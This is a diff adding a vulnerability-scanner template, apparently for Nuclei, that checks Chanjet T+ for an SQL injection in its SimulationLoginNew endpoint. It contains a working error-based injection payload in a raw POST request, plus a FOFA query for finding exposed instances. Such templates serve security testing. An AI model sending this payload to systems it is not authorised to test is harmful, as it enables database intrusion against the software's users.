@@ -1,0 +1,28 @@
+id: yong-you-chang-jie-tong-t-plus-simulation-login-new-sql-injection
+
+info:
+  name: "畅捷通T+ SimulationLoginNew接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    用友畅捷通T+系统中，SimulationLoginNew接口存在SQL注入漏洞。攻击者可利用该漏洞执行恶意SQL语句，获取数据库敏感信息。
+
+    fofa: app="畅捷通-TPlus"
+  tags: 畅捷通-TPlus
+
+http:
+- raw:
+  - |
+    POST /tplus/GLSyncService.asmx/SimulationLoginNew HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    toAccountName=1' AND 1 = CONVERT(int, @@version) --&UserName=&AdminPwd=&currentYear=2023-09-09
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+      - 'Microsoft SQL'
+      - "nvarchar"
+    condition: and
